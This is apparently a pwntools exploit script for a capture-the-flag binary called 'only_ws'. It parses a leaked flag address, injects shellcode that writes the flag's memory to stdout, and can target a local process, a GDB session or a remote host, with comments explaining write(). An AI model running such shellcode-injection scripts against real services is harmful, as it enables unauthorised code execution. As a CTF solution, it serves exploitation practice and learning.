from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = './only_ws'
elf = context.binary = ELF(exe, checksec=False)
context.terminal = ['wt.exe', 'bash', '-c']
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")

offset = 72

io = start()


shellcode = asm(shellcraft.write(1, 'rsp', 'eax'))


io.recvuntil(b'at ')
flag = int(io.recvline(),16)
info(f'flag at offset: %#x',flag)

shellcode = asm(shellcraft.write(1, flag, 100))

'''
ssize_t write(int fd, const void *buf, size_t count)

fd → file descriptor (integer identifying where to write)

    1 = standard output (stdout)
    2 = standard error (stderr)
    0 = standard input (not for write)


buf → pointer to the data to write.
count → how many bytes to write.

'''

io.sendline(shellcode)

print(io.recv())

io.interactive()
